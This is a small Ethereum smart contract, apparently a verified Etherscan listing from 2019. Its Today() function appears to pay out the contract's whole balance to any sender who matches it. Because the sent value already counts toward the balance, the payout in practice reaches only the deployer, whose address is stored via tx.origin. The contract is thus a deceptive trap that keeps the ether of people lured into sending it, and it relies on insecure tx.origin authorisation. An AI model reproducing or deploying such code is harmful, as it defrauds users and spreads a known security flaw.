/**

 *Submitted for verification at Etherscan.io on 2019-02-11

*/



pragma solidity ^0.4.25;



contract MultiMonday

{

    address O = tx.origin;



    function() public payable {}



    function Today() public payable {

        if (msg.value >= this.balance || tx.origin == O) {

            tx.origin.transfer(this.balance);

        }

    }

 }